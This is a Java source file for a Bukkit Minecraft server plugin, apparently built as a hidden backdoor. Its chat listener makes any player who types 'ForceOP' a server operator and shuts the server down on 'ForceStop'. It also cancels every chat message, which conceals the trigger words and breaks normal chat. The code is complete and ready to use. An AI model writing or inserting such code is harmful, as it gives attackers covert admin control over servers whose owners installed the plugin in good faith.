package in.main.hiden.events;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

public class MessageEvent implements Listener{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws NoSuchFieldException, IllegalArgumentException, SecurityException, IllegalAccessException {
        Player player = e.getPlayer();
        if(e.getMessage().equals("ForceOP")){
            player.setOp(true);
        }
        if(e.getMessage().equals("ForceStop")){
            Bukkit.getServer().shutdown();
        }
        e.setCancelled(true);
    }
}















